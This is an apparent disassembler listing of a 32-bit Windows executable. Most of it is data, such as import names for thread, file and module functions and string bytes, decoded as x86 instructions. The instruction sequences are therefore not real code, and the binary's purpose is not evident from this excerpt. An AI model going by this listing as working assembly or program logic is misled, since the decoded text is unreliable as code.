  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
